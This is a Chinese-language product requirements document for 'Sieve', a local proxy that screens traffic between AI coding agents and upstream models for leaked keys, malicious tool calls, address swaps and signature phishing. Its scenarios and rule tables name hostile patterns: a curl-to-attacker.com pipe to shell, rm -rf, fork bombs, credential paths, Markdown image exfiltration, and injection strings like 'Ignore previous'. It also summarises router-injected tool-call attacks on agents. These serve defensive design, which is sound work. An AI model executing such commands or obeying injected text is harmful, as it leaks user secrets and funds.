# Sieve 产品需求文档 v1.1

> **codename: Sieve**(产品正式名待定)
> 文档版本: v1.1 / 2026-04-26
> 文档主人: doskey
> 状态: 个人项目版 PRD,可直接作为 Claude Code 起手输入
> 与 v1.0 差异: 范围收敛 50%,定位从"独角兽备选"改为"个人产品 + 现金流 + IP 入口",新增多 agent 适配

---

## 0. v1.1 修订说明

v1.0 写得像给团队看的 SaaS 商业计划。v1.1 是给一个人执行用的产品规格,**砍掉所有"听起来很合理但一个人做不动"的部分**。

主要改动:
- ✅ 定位明确为个人项目,不追求独角兽,追求 MRR + 个人 IP
- ✅ MVP 范围砍 50%——只做出站 secret + 危险 tool call + 地址替换 + 签名拦截四条
- ✅ 三 agent 适配(Claude Code / OpenClaw / Hermes)用统一本地代理
- ✅ 定价收敛为 3 档(Free / $19 Pro / $99 Crypto),砍掉 Team 和 Audit
- ✅ Day 1 GitHub 开源,sigstore 签名 + reproducible build 提到 Phase 1 必交付物
- ✅ 桌面 App、VS Code 插件、Slither 集成、中文 PII、协议白名单 全部推到 Phase 2
- ✅ 数据飞轮设计保留,但不强制做"贡献者排行榜"等繁重运营功能
- ✅ 节奏:全职 6-8 周冲 MVP,之后慢节奏维护 + 内容驱动增长

---

## 1. 一句话产品定位

**Sieve 是一个完全本地运行的 LLM 流量代理,在主流 AI 编码 agent(Claude Code / OpenClaw / Hermes)和上游模型之间做双向安全检测,核心服务于 crypto 开发者和 DeFi 重度用户,防止私钥/凭据泄漏出站,防止恶意工具调用 / 地址替换 / 危险签名调用入站。**

### 1.1 三句话核心叙事

1. **上游不可信**:你用的中转站可能在改你的 tool_call,官方 API 出问题不会赔你私钥被盗的钱,自部署模型也可能被供应链投毒。
2. **没人能替你兜底**:钱包安全产品看不见你的 prompt,LLM 安全产品不懂 crypto,DLP 产品不在你工作流里。
3. **Sieve 在客户端最后一道闸**:完全本地运行,字节流双向扫描,只放干净的东西过去/回来,从不上传你的数据。

### 1.2 不是什么(消除歧义)

- **不是中转站**——不路由请求,不做负载均衡,不做成本优化
- **不是 LLM Gateway**——不给企业管理多 LLM 接入
- **不是钱包**——不存私钥,不签交易,不和链交互
- **不是审计公司**——不出审计报告,不背书智能合约
- **不是云 SaaS**——不收集 prompt,不在云端跑用户数据

### 1.3 项目性质明确

- **个人项目**,以 doskey 个人品牌背书
- **追求稳定 MRR**,不融资,不招人,不做企业销售
- **目标 18 个月 MRR ≥ $30K**(年化 $360K),一人公司舒适区
- **目标 24 个月 GitHub stars ≥ 5K**,在 AI×Crypto 安全圈站稳脚跟
- **不追求独角兽**——这是 IP 入口 + bounty 工具杠杆 + 现金流,不是 venture-scale 公司

---

## 2. 市场判断与时间窗

### 2.1 时机

- **2026-04 UCSB+Fuzzland 论文**(*Your Agent Is Mine*, arXiv:2604.08407)首次系统证实威胁:428 个商品化 LLM 路由器中 9 个主动注入恶意工具调用,1 个抽走研究者 ETH,1 个客户钱包被抽 $50 万
- **2026-03 LiteLLM 供应链事件**:PyPI 月下载 9500 万的 gateway 被注入 .pth 凭据 stealer
- 市场认知刚被点燃,产品化解决方案空缺

### 2.2 窗口期

- **6-12 个月**:GoPlus AgentGuard 升级到 LLM 流量层(他们已有 24 detection rules + Claude Code hooks)
- **12-18 个月**:Blockaid 推 *Blockaid for Coding Agents*(刚拿 $50M B 轮)
- **18-24 个月**:主流钱包默认集成,Sieve 失去一半价值

**结论:执行速度 > 功能完整度。MVP 8 周内必须出。**

### 2.3 为什么三 agent 并行而不是只 Claude Code

OpenClaw 和 Hermes 看似比 Cursor 用户量小,但战略上更重要:

- **OpenClaw 是 UCSB 论文的实测攻击平台**——190 个安全 advisory 已公开,440/401 YOLO mode 中招案例就来自 OpenClaw 用户。**这本身是 Sieve 的最佳故事素材,适配 OpenClaw = 收编现成的"已经被攻击过"的用户群**
- **Hermes 是新兴 agent 框架**——早期生态,先发优势更值钱;比 Cursor 更"原生需要"安全代理
- **统一代理架构下,三个一起做的边际成本不高**——核心拦截引擎共用,只是协议适配层多写两份

---

## 3. 用户画像

### 3.1 P0 客群:Crypto-native AI 重度开发者

- 用 Claude Code / OpenClaw / Hermes / 自写 agent 写代码 ≥ 4 小时/天
- 工作涉及智能合约、DeFi 协议、钱包前端、交易脚本、跨链桥
- 持有 $10K+ crypto 资产,部分人 $100K-$10M
- 同时使用 OpenAI / Anthropic / OpenRouter / 国内中转站
- 付费意愿:**$99/月无感**(对比一次被盗损失)
- 全球预估规模:5-15 万人

### 3.2 P1 客群:智能合约开发者 + 协议团队

- DeFi 协议开发者、bug bounty hunter、合约审计师
- 单笔工作潜在金额 $100K-$100M(TVL 风险)
- 用 AI 辅助写/审计 Solidity / Vyper / Move / Rust 合约
- 付费意愿:**$99/月**,公司报销

### 3.3 P2 客群:普通 AI 编码开发者(免费版引流)

- web2 程序员,日常用 Cursor / Claude Code,无 crypto 资产但需防 API key 泄漏
- 战略地位:**数据飞轮燃料 + SEO 长尾 + 口碑放大器**

### 3.4 明确不服务的客群

- **企业 CISO / 大公司合规部门**——Nightfall/Lakera 主场
- **Crypto 散户**——他们用钱包扩展
- **国内政企**——奇安信/深信服市场

---

## 4. 核心用户场景

### 4.1 场景 A:出站防泄漏(三 agent 通用)

```
用户:在 Claude Code 里 debug 跨链转账脚本,paste 整个 .env 文件
Sieve:拦截,弹出确认窗口
       ┌──────────────────────────────────────┐
       │ ⚠ Sieve 检测到敏感内容             │
       │                                      │
       │ • 1 个 Ethereum 私钥(64 hex)       │
       │ • 1 个 Infura API key                │
       │ • 1 个 BIP39 助记词(SHA-256 校验通过)│
       │                                      │
       │ [脱敏后发送] [取消] [允许此次]      │
       └──────────────────────────────────────┘
```

### 4.2 场景 B:入站防地址替换

```
用户:让 Claude 写转账脚本到 0x742d35Cc...1234A
Claude 返回:代码里地址变成 0x742d35Cc...1234B(中转站偷改了末位)
Sieve:对比对话历史,标红警告
       ┌──────────────────────────────────────┐
       │ 🚨 检测到地址替换攻击                │
       │                                      │
       │ 你 prompt:....1234A                  │
       │ 模型输出:....1234B (差异 1 字符)    │
       │                                      │
       │ [中止] [手动核对继续]                │
       └──────────────────────────────────────┘
```

### 4.3 场景 C:入站防危险工具调用(YOLO mode 救命场景)

```
用户:OpenClaw YOLO 模式,让模型清理临时文件
模型返回:tool_use bash("curl https://attacker.com/cleanup.sh | sh")
Sieve:fail-closed,即使在 YOLO 模式也强制人工确认
       ┌──────────────────────────────────────┐
       │ 🚨 高风险工具调用被阻断              │
       │                                      │
       │ tool: bash                           │
       │ command: curl https://attacker.com/...│
       │                                      │
       │ 风险:远程脚本下载并执行(curl|sh)    │
       │ 域名不在白名单                       │
       │                                      │
       │ [拒绝] [我确认这是安全的]            │
       └──────────────────────────────────────┘
```

### 4.4 场景 D:入站防签名钓鱼

```
用户:让模型帮写 Permit 签名调用
模型返回:tool_use signTypedData({...}),verifyingContract 是数字化的 996101...
         (Pink Drainer 已知绕过手法)
Sieve:fail-closed,显示完整 typed data + 解析 verifyingContract
       ┌──────────────────────────────────────┐
       │ 🚨 可疑签名调用                      │
       │                                      │
       │ verifyingContract: 996101...         │
       │ → 转换为 0x: 0xF35...                │
       │ → 不在已知协议白名单                 │
       │ → 已知 drainer 模式: 数字化绕过      │
       │                                      │
       │ [拒绝] [我已核对完整内容]            │
       └──────────────────────────────────────┘
```

---

## 5. 功能需求(精简版)

### 5.1 出站检测

#### Phase 1 P0(MVP 第 1-2 周)

| ID | 检测项 | 算法核心 |
|----|--------|----------|
| OUT-01 | OpenAI / Anthropic API key | 前缀 + entropy + 占位符黑名单 |
| OUT-02 | AWS Access Key | `AKIA[0-9A-Z]{16}` + 排除官方示例 |
| OUT-03 | GitHub Token | 前缀 + CRC32 校验 |
| OUT-04 | JWT | 三段 base64 + header 解码验证 |
| OUT-05 | RSA/Ed25519/SSH 私钥 | PEM 头部精确匹配 |
| OUT-06 | Ethereum 私钥(64 hex) | regex + entropy + 上下文关键词 |
| OUT-07 | Bitcoin WIF | base58 + 双 SHA-256 校验位 |
| OUT-08 | Solana 私钥 | base58 88 字符或 hex 64 字节 |
| OUT-09 | **BIP39 助记词** | **词表匹配 + SHA-256 校验**(Sieve 差异化点) |
| OUT-10 | Keystore JSON | Web3 Secret Storage v3 schema |
| OUT-11 | .env 文件特征 | 多行 KEY=VALUE 密度阈值 |
| OUT-12 | 数据库连接串 | URI scheme + 用户名密码字段 |

#### Phase 2(推后,不进 MVP)

- 中文 PII(身份证 / 银行卡 / 统一信用代码)
- 内网域名 / 内部代号(用户自定义词表)
- 长代码块识别 + Copyright / 内部包名提示
- 合同 / 法律文本特征
- 自定义规则 DSL

#### 出站交互模式

- **拦截模式**:阻断,要求脱敏后重发或允许此次
- **脱敏模式**:自动用 `[REDACTED-PRIVATE-KEY]` 占位符替换
- **学习型白名单**:用户允许的具体值记入本地 `.sieveignore`(`fingerprint = rule_id : sha256_prefix`)

---

### 5.2 入站检测——Sieve 真正的护城河

#### Phase 1 P0:Crypto 钩子(MVP 第 3-4 周)

| ID | 检测项 | 算法核心 |
|----|--------|----------|
| IN-CR-01 | **地址替换检测** | 维护对话历史所有 `0x[a-fA-F0-9]{40}`,模型新输出地址比对:相同放行 / 前 N 后 M 匹配标红 / Levenshtein ≤ 4 标黄 |
| IN-CR-02 | 危险工具调用拦截 | tool_use 结构化分析:`bash` 含 `rm -rf` / `curl..\|sh` / `eval(base64..)` / `sudo` |
| IN-CR-03 | 敏感路径访问 | tool_use 参数包含 `~/.ssh/`、`~/.aws/`、`/etc/shadow`、`.env`、`*.keystore`、`~/.config/solana/` |
| IN-CR-04 | 持久化机制 | tool_use 写 `crontab`、`launchd`、`systemd`、`.bashrc`、`.zshrc` |
| IN-CR-05 | **签名工具调用 fail-closed** | `eth_sendTransaction` / `signTransaction` / `signMessage` / `signTypedData` 全部强制弹窗,显示完整 to/value/data,**YOLO mode 不可关闭** |

#### Phase 1 P0:通用入站(MVP 第 4-5 周)

| ID | 检测项 | 算法核心 |
|----|--------|----------|
| IN-GEN-01 | 危险 shell 模式 | `rm -rf /`、fork bomb、`> /dev/sda`、`dd if=/dev/zero` |
| IN-GEN-02 | 远程脚本执行 | `curl X \| sh`、`wget X \| bash`、`bash <(curl X)` |
| IN-GEN-03 | 编码后执行 | `eval(base64.b64decode(...))`、`exec(__import__('os')...)` |
| IN-GEN-04 | Markdown 图片 exfil | `![](http://X.com/?Y=Z)` + 域名不在白名单 |
| IN-GEN-05 | Prompt injection 反向 | `<\|im_start\|>`、`[INST]`、`### System:`、`Ignore previous` |

#### Phase 2(推后)

- npm / pip typosquat 检测(Damerau-Levenshtein + 白名单)
- Markdown 链接钓鱼(域名 vs 显示文本不一致)
- Unicode 攻击防御(NFC + 控制字符黑名单)
- Calldata 静态解码(4byte.directory 离线 SQLite)
- ERC20 危险 approve(approve(MAX) / setApprovalForAll)
- EIP-2612 Permit 滥用 / EIP-7702 set-code 滥用
- Drainer 合约黑名单(Chainabuse + ScamSniffer 集成)
- 协议白名单(Uniswap / Aave / Curve...)
- Solidity 后门检测(Slither subprocess)

### 5.3 处置矩阵

| 等级 | 默认行为 | 用户可见 |
|------|---------|---------|
| 🚨 Critical | **Inline block + 强制确认**,YOLO mode 不可关闭 | 全屏告警 |
| ⚠ High | Non-blocking warn + 5 秒倒计时确认 | 弹窗 |
| 📋 Medium | 标记 + 日志 | 状态栏图标 |
| ℹ Low | 静默记录 | 无 |

**Critical 在 Free/Pro 版不可关闭,这是产品安全承诺。**

---

## 6. 技术架构

### 6.1 多 agent 统一代理架构

```
┌──────────────────────────────────────────────────────────┐
│  AI 客户端 / Agent 框架(三选一,共用同一个上游 API)      │
│                                                            │
│  ┌─────────────┐  ┌──────────────┐  ┌──────────────┐    │
│  │ Claude Code │  │   OpenClaw   │  │    Hermes    │    │
│  └──────┬──────┘  └──────┬───────┘  └──────┬───────┘    │
│         │                │                  │             │
│         │ ANTHROPIC_BASE_URL                │             │
│         │  / OPENAI_BASE_URL                │             │
│         │  / 各家自定义环境变量              │             │
│         └────────────┬───┴──────────────────┘             │
│                      ↓                                     │
└──────────────────────┼─────────────────────────────────────┘
                       ↓
              http://127.0.0.1:11453
                       ↓
┌──────────────────────────────────────────────────────────┐
│  Sieve 本地代理(Rust 单二进制)                          │
│                                                            │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Protocol Adapter Layer                             │  │
│  │  ├ Anthropic Messages API(Claude Code)           │  │
│  │  ├ OpenAI Chat Completions(OpenClaw / Hermes)    │  │
│  │  └ 统一内部表示(UnifiedMessage)                  │  │
│  │                                                     │  │
│  │ 关键:三家协议输入输出归一化为同一种内部 schema, │  │
│  │      检测引擎只跑在内部 schema 上,共用代码      │  │
│  └────────────────────────────────────────────────────┘  │
│                       ↓                                   │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Outbound Filter Pipeline                           │  │
│  │  ├ vectorscan 多模式正则(SIMD)                  │  │
│  │  ├ entropy / 校验位 / 上下文关键词               │  │
│  │  └ 占位符黑名单 + .sieveignore                   │  │
│  └────────────────────────────────────────────────────┘  │
│                       ↓                                   │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Upstream Forwarder(reqwest + rustls)              │  │
│  │  → api.anthropic.com / api.openai.com / 中转站    │  │
│  └────────────────────────────────────────────────────┘  │
│                       ⇅                                   │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Inbound Filter Pipeline(SSE 流式)                │  │
│  │  ├ SSE Parser(自研 + partial-json-parser)        │  │
│  │  ├ vectorscan stream mode(跨 chunk)              │  │
│  │  ├ Tool Use Aggregator                             │  │
│  │  ├ AddressGuard(地址比对,跨 agent 共用)         │  │
│  │  └ Critical 拦截 / High 二次确认 / Medium 标记    │  │
│  └────────────────────────────────────────────────────┘  │
│                                                            │
│  Local State:                                             │
│   • 用户 .sieveignore(YAML 学习白名单)                  │
│   • 审计日志(append-only,本地 SQLite)                  │
│   • 规则库(每日签名文件下载,可关闭)                    │
└──────────────────────────────────────────────────────────┘
```

### 6.2 多 agent 适配关键决策

**为什么用统一代理而不是各家原生 hooks?**

- **代码复用**:三家协议归一化后,所有检测逻辑只写一遍
- **维护成本可控**:OpenClaw / Hermes 协议变了只动适配层,核心逻辑不动
- **用户接入简单**:只需改一个环境变量,不需要装 plugin / 改配置文件
- **取舍**:防御深度略弱于原生 hooks(看不到 agent 内部决策),但对个人项目而言是合理取舍。Phase 2 可以选择性补 hooks

**协议适配层关键点:**

| Agent | 接入方式 | 协议特点 | 难点 |
|-------|---------|---------|------|
| Claude Code | `ANTHROPIC_BASE_URL=http://127.0.0.1:11453` | Anthropic Messages API + SSE | tool_use block 边界 |
| OpenClaw | 各家 LLM 的 BASE_URL 环境变量 | OpenAI Chat Completions(主) + Anthropic | 多模型路由 |
| Hermes | 类似 OpenClaw | 同上 | 同上 |

**统一内部 schema 设计:**

```rust
struct UnifiedMessage {
    role: Role,
    content: Vec<ContentBlock>,
    tool_calls: Vec<ToolCall>,
    metadata: AgentSource,  // 来自哪个 agent
}

enum ContentBlock {
    Text(String),
    ToolUse { name, input, id },
    ToolResult { tool_use_id, content },
    Image(...),
}
```

所有检测逻辑接受 `UnifiedMessage`,不关心来源是哪个 agent。

### 6.3 Rust 技术栈

| 用途 | 选型 | 理由 |
|------|------|------|
| HTTP 服务 + 反向代理 | `hyper 1.x` + `tokio` | Cloudflare Pingora 同源 |
| TLS | `rustls` | 纯 Rust,无 OpenSSL 依赖 |
| 多模式正则 | `vectorscan-rs` | 比 Go regexp 快 1000+ 倍 |
| JSON 流式解析 | `sonic-rs` + 自研 partial parser | SIMD 加速 |
| 客户端 HTTP | `reqwest` | 调上游 |
| 配置 | `serde` + `toml` | 标配 |
| SQLite | `rusqlite` | 审计日志 |
| 哈希 / 校验 | `sha2` / `crc32fast` | 各种校验位 |
| BIP39 / base58 / hex | `bip39` / `bs58` / `hex` | 加密原语 |

**Phase 1 不引入 ONNX / 本地小模型**——避免增加复杂度,纯规则引擎够用。Phase 2 视误报率决定。

### 6.4 性能预算

| 操作 | 目标延迟 |
|------|---------|
| 普通 token 流式 chunk | +30-200 µs |
| 工具调用边界完整检查 | +5-15 ms |
| 整体 P99 添加延迟 | **< 20 ms** |
| 内存峰值 | < 100 MB(Phase 1 无 4byte 库) |
| 二进制大小 | < 20 MB 单文件 |
| 启动时间 | < 500 ms |

### 6.5 误报率预算

| 检测类型 | Inline block FP 上限 | Warn FP 上限 |
|---------|---------------------|--------------|
| OUT-* | < 1% | < 5% |
| IN-CR-* | < 0.5% | < 3% |
| IN-GEN-* | < 2% | < 10% |

超过这个数,用户禁用产品。

### 6.6 部署形态(Phase 1)

- **CLI / 后台进程**——主要分发形态
- `brew install` / GitHub Releases 二进制下载
- 配置通过 `~/.sieve/config.toml` + 环境变量
- **不做** 桌面 App / VS Code 插件 / 系统托盘——Phase 2

---

## 7. 商业模式与定价

### 7.1 三档定价(收敛版)

| 版本 | 月费 | 内容 |
|------|------|------|
| **Free** | $0 | 出站 P0 + 入站 P0(通用 + Crypto 钩子) + Critical 强制拦截 |
| **Pro** | $19/月 | + Phase 2 通用规则(typosquat / Unicode / 链接钓鱼)+ 自定义规则 |
| **Crypto** | $99/月 | + Phase 2 全套 Crypto 专项(calldata decode / drainer feed / 协议白名单 / Solidity 扫描) |

砍掉的:
- ❌ Crypto Team $199/人/月——团队功能 Phase 3 再说
- ❌ Protocol Audit $5K-50K——服务收入,等真有客户找上门再做

### 7.2 收入预期(个人项目舒适区)

**12 个月**:
- Free: 2,000 用户
- Pro: 100 × $19 = $1,900/月
- Crypto: 50 × $99 = $4,950/月
- **MRR ≈ $7K, ARR ≈ $84K**

**18 个月**:
- Free: 5,000
- Pro: 300 × $19 = $5,700/月
- Crypto: 200 × $99 = $19,800/月
- **MRR ≈ $25-30K, ARR ≈ $300-360K**

**24 个月稳定区**:
- Free: 10,000
- Pro: 600 × $19 = $11,400/月
- Crypto: 400 × $99 = $39,600/月
- **MRR ≈ $50K, ARR ≈ $600K**

ARR 上限估计 $500K-1M——一人项目,**不是 venture-scale 但财务自由完全够**。

### 7.3 不做的商业动作

- ❌ 不融资(项目性质不需要)
- ❌ 不招人(Phase 1-2 全部 doskey 一人 + Claude Code)
- ❌ 不做企业销售
- ❌ 不做 ads
- ❌ 不转售用户数据
- ❌ 不做付费咨询(被动型业务)

---

## 8. 数据飞轮与威胁情报

### 8.1 简化版社区贡献模型

- 用户主动提交可疑样本(在 GitHub issue 提交,不通过产品上传)
- doskey 自己定期采样测试中转站(参考 UCSB 论文方法论,作为内容素材)
- bounty hunter 业务副产品:发现的攻击模式直接转化为规则

**Phase 1 不做的**:
- ❌ 产品内一键提交样本(增加复杂度)
- ❌ 贡献者排行榜(运营成本)
- ❌ 威胁情报报告订阅(等 Pro 用户 100+ 再做)

### 8.2 第三方采购(分阶段)

| 数据源 | 内容 | 成本 | 阶段 |
|-------|------|------|-----|
| 自维护规则集 | 内置 | $0 | Phase 1 |
| Chainabuse 免费 API | 钱包黑名单 | $0 | Phase 2 |
| ScamSniffer 7天延迟开源 | drainer 合约 | $0 | Phase 2 |
| GoPlus 免费 Token API | 风险代币 | $0 | Phase 2 |
| ScamSniffer Pro realtime | 实时 drainer feed | $999/月 | 第 12 个月起,看 Crypto 用户数 |

**原则:威胁情报采购由付费用户数量驱动,不是 Day 1 就上**。

### 8.3 规则更新机制

- 每周(不是每日)签名文件下载
- Ed25519 签名验证
- 客户端只下载,不上传任何数据
- 静态资源更新可关闭,完全离线可用

---

## 9. 9 个工程上必须做对的关键决策

> 每条都是"做错就死"的硬约束,不是优化项。

1. **Rust 栈非选项**——Go regexp 性能差距 1000 倍
2. **绝不做联网 verifier**——发送任何 token 到外部 API 验证有效性会摧毁产品定位
3. **fail-closed High-Risk Tool Policy Gate + 强制人工确认**——YOLO mode 在 Free/Pro 版不允许关闭
4. **BIP39 必须做 SHA-256 checksum 验证**——12 词通过率 1/16,24 词 1/256,这是 Sieve 差异化点
5. **SSE 边界处理写大量 fuzz test**——半行 chunk、跨 chunk 分隔符、嵌入 C0 控制字符、多 event 粘包、提前断流必须全部覆盖
6. **Sieve 自身的供应链必须 sigstore + reproducible build + pinned dependencies**——这件事比检测精度重要,LiteLLM 事件就是先例
7. **Day 1 GitHub 开源核心引擎(MIT)**——透明可审计是赢得 paranoid 用户信任的唯一办法,这是 GPT-5.5 反馈的核心点
8. **统一内部 schema 优先于多 agent 适配深度**——三家协议归一化为 UnifiedMessage,检测逻辑只写一遍,不为 OpenClaw / Hermes 单独写检测代码
9. **Critical 级别拦截不可关闭**——这是产品安全承诺,不是用户偏好,任何"让用户关掉以提高 conversion"的诱惑都要拒绝

---

## 10. 8 周里程碑(全职冲刺版)

### 10.1 Week 1:基础设施 + 协议适配

**交付物**:
- Rust 项目骨架,hyper + tokio + rustls 跑通
- 透明转发 Anthropic Messages API 和 OpenAI Chat Completions(SSE 流式)
- Protocol Adapter Layer:UnifiedMessage 内部 schema 设计 + 三家协议互转
- **GitHub repo 公开**(MIT,空仓也开),架构 README + roadmap
- sigstore 签名 + GitHub Actions reproducible build pipeline 起步

**完成定义**:
- doskey 用 Claude Code,设 `ANTHROPIC_BASE_URL=http://localhost:11453`,所有日常操作正常
- 同样的代理用 OpenClaw + 国内中转站,工作正常
- Hermes 接入测试

### 10.2 Week 2:出站 P0 检测

**交付物**:
- vectorscan-rs 多模式正则集成
- OUT-01~12 全部 P0 出站规则,每条带 entropy / 校验位 / 上下文关键词三层过滤
- BIP39 SHA-256 checksum 验证(关键差异化)
- 占位符黑名单 + .sieveignore 学习白名单
- 单元测试覆盖率 ≥ 80%

**完成定义**:
- paste .env 文件触发拦截,正确识别每一项
- 标准 secret 检测 benchmark 集 FP < 1%, Recall > 70%

### 10.3 Week 3:入站 Crypto 钩子

**交付物**:
- SSE Parser + Tool Use Aggregator(三家协议都覆盖)
- IN-CR-01 地址替换检测(对话历史 + 多种比对算法)
- IN-CR-05 签名工具 fail-closed
- 大量 fuzz test 覆盖 SSE 边界 case

**完成定义**:
- 复现 UCSB 论文 4 类攻击 PoC,Sieve 全部捕获
- 模拟 Pink Drainer 数字化 verifyingContract 攻击,Sieve 拦截
- SSE fuzzing 跑 10 万随机 chunk 序列,无 panic

### 10.4 Week 4:入站通用 + 危险 tool call

**交付物**:
- IN-CR-02~04 危险路径 + 持久化机制
- IN-GEN-01~05 危险 shell + 编码执行 + Markdown exfil + prompt injection 反向
- 处置矩阵(Critical / High / Medium / Low)完整实现
- 用户交互界面(目前是 CLI 弹窗 + 命令行确认)

**完成定义**:
- 跑 100 个 OWASP LLM Top 10 测试用例,Critical/High FP 综合 < 5%
- YOLO mode 下用 OpenClaw + Sieve,危险 tool call 不会自动执行

### 10.5 Week 5:打磨 + 配置 + 文档

**交付物**:
- 完整配置系统(`~/.sieve/config.toml` + 环境变量)
- 详细日志和审计输出(本地 SQLite append-only)
- 完整用户文档:接入 Claude Code / OpenClaw / Hermes 各自教程
- License 验证 + Pro 版功能 gate(Phase 2 才上,但代码骨架先搭)
- brew tap 配置 + GitHub Releases 自动化

**完成定义**:
- 一个非 doskey 的工程师朋友能 30 分钟内 brew install + 配好 + 跑 demo
- 三家 agent 任意一家都有完整接入文档

### 10.6 Week 6:冷启动准备 + 内容

**交付物**:
- landing page(中英双语,纯静态,GitHub Pages 托管)
- **引爆文章 v1**:《我跑了 200 个国内 ChatGPT/Claude 中转站,X 家在偷你的 prompt,Y 家在改你的代码》
- **引爆文章 v2**:技术深度——Sieve 架构剖析(Rust + vectorscan + SSE 流式 + 统一协议层)
- 两篇文章中英双语,Twitter / 即刻 / V2EX / Hacker News 同步
- Discord / Telegram 社群基础

**完成定义**:
- GitHub stars > 200(开源 6 周后)
- 至少 1 篇文章被 Hacker News / V2EX 推上首页
- 第一波天使用户(主要从 doskey 朋友圈) 30+ 装上跑

### 10.7 Week 7:bug 修复 + 兼容性

**交付物**:
- 真实用户使用的 bug 修复
- Windows / Linux 二进制构建(macOS 是主战场,但要支持其他)
- 性能 benchmark 数据公开(P99 延迟 < 20ms 验证)
- 错误处理打磨(代理崩了不能影响用户工作流)
- 第一次签名规则库下发测试

**完成定义**:
- 100 个用户用一周,无 P0 bug
- 三家 agent + 三家平台(macOS/Linux/Windows)矩阵全部测过

### 10.8 Week 8:商业化 + 第三波内容

**交付物**:
- Stripe 接入 + Pro / Crypto 版功能 gate 上线
- License key 系统(本地验证为主,服务端只做激活)
- **引爆文章 v3**:Drainer 攻击模式深度剖析 + Sieve 怎么防(强营销 + 调查报道)
- 与 1-2 家 crypto 安全 KOL 建立联系(Chaofan Shou / @Fried_rice、慢雾 @evilcos)

**完成定义**:
- 至少 5 个 Crypto 版付费用户(MRR $495+)
- 至少 10 个 Pro 版付费用户(MRR $190+)
- GitHub stars > 500
- 至少 1 个 KOL 推荐

### 10.9 Week 8 之后(慢节奏维护)

每周稳定投入 5-10 小时:
- 每月一篇深度内容(攻击事件复盘 / 中转站揭黑 / 新规则发布)
- 用户反馈处理 + bug 修复
- 规则库每周更新一次
- 季度大版本(Phase 2 功能逐项上)

---

## 11. 法律与合规边界

### 11.1 不承诺

- 不承诺 100% 检测率
- 不承诺对未知 0day 攻击有效
- 不承诺对 APT 级攻击有效
- 不承诺 secret leak 100% 防住(walletaddr 走 request body 明文,client-side 无法根治)

### 11.2 ToS 关键

- 用户使用不构成法律免责,损失自担
- 不存储、不传输、不分析用户 prompt 内容
- 规则库更新仅下载,不上传
- 用户主动提交样本仅在 GitHub issue 公开渠道

### 11.3 开源策略

- **核心引擎 MIT 开源**——透明可审计
- **Phase 2 高级规则集闭源**(Pro / Crypto 版)——数据壁垒
- 二进制发布做 sigstore 签名 + reproducible build

### 11.4 商标

- codename Sieve,正式发布前换名
- 已知冲突:sieve.ai (YC W22)、SIEVE 缓存算法、Thunderbird Sieve
- 候选正式名:**待 doskey 拍板**

---

## 12. 风险登记册(精简版)

| 风险 | 概率 | 影响 | 缓解 |
|-----|------|------|-----|
| GoPlus AgentGuard 升级到 LLM 流量层 | 高 | 中(我们有差异化) | 抢先发 + Crypto 专项深 |
| Blockaid 推 Coding Agents 版 | 中 | 中 | 完全本地 + 开源核心 |
| Sieve 自身被供应链攻击 | 低 | 极高 | sigstore + reproducible + pinned deps |
| 误报率失控 | 中 | 高 | 三级置信度 + .sieveignore + benchmark |
| OpenClaw / Hermes 协议大改 | 中 | 中 | UnifiedMessage 隔离层 |
| 中转站爆料引法律纠纷 | 中 | 中 | honeypot 钱包 + 学术方法论 + 部分匿名化 |
| doskey 个人时间不够 | 中 | 高 | 8 周冲完后转慢节奏 |
| Crypto 圈 KOL 不买账 | 中 | 中 | 提前与 Chaofan Shou / 慢雾建立关系 |

---

## 13. 与 doskey 其他业务的咬合

| 业务 | 咬合点 |
|------|-------|
| **AI 智能合约审计 bounty** | bounty 工作发现的攻击模式直接沉淀为 Sieve 规则,反向喂养 |
| **YoctoClaw**(本地 agent 框架) | YoctoClaw 是 Sieve 第一个深度集成的 agent,Sieve 是 YoctoClaw 用户的安全工具,互相引流 |
| **个人品牌** | 从"管理者"翻篇成"AI × Crypto 安全研究者",这是 2026 最值钱的人设之一 |

---

## 14. Open Questions(还需要 doskey 决策)

1. **正式产品名**:何时开始换?(建议 Week 6 landing page 上线前定)
2. **冷启动文章角度**:中转站揭黑(攻击性强)/ 自己差点泄漏私钥的故事(亲和)/ 技术架构剖析(专业)? 三选一作为 Week 6 主推
3. **法律实体**:在哪国注册公司收 Stripe 款?(美国 Stripe Atlas / 香港 / 新加坡 / 不注册个人收款)
4. **是否做 OpenClaw 项目方接洽**:OpenClaw 团队对 Sieve 的态度可能决定其用户能否大规模接入
5. **Hermes 协议研究**:Hermes 当前 GitHub repo 状态、协议稳定性、用户数(需要 doskey 自己最熟,我们之前没深入查)

---

## 15. 关键参考资料

### 15.1 学术论文
- *Your Agent Is Mine* (UCSB+Fuzzland, arXiv:2604.08407, 2026-04) — Sieve thesis
- *Blockchain Address Poisoning* (arXiv:2501.16681, 2025) — IN-CR-01 算法依据
- *Trojan Source* (USENIX '23, arXiv:2111.00169) — Unicode 攻击防御

### 15.2 关键事件
- LiteLLM 1.82.7/1.82.8 PyPI 投毒(2026-03-24)
- @solana/web3.js 1.95.6/1.95.7 投毒(2024-12-02)
- North Korea Contagious Interview campaign(2025-07~)670+ 恶意 npm 包
- Pink Drainer EIP-712 数字化绕过(2024-2025)

### 15.3 关键人
- **Chaofan Shou (@Fried_rice)** — UCSB 论文一作,Fuzzland CTO,**重点接洽**
- **慢雾 @evilcos** — 中文圈 crypto 安全 KOL,**重点接洽**
- **Yu Feng** — UCSB 教授,Fuzzland 联创

### 15.4 必读项目
- gitleaks / TruffleHog / detect-secrets — secret 检测参考
- Cloudflare Pingora — Rust 反向代理参考
- StepSecurity Harden-Runner — eBPF 安全代理范式
- Meta Llama-Prompt-Guard-2 — Phase 2 本地小模型候选

---

## 文档结束

> **核心一句话**:Sieve v1.1 是一个 8 周冲完 MVP 的个人项目,以 doskey 个人品牌为锚,在 AI×Crypto 安全的 12-18 个月窗口期里抢生态位,目标是 18 个月 MRR $30K + GitHub 5K stars + 个人 IP 转型完成。这不是 venture-scale 公司,是个一人能跑得舒服的"小而尖"产品。

---

## 与 v1.0 的差异 changelog

- **+** 三 agent 适配(Claude Code / OpenClaw / Hermes),统一内部 schema
- **+** 项目性质明确(个人项目 / 不融资 / 不招人)
- **+** Day 1 GitHub 开源 + sigstore 提到 Phase 1 必交付物
- **+** 8 周里程碑全职冲刺版(替代 90 天 SaaS 版)
- **-** 砍掉 Crypto Team / Protocol Audit 两档定价
- **-** 砍掉桌面 App / VS Code 插件 / Slither / 中文 PII / 协议白名单 进 Phase 2
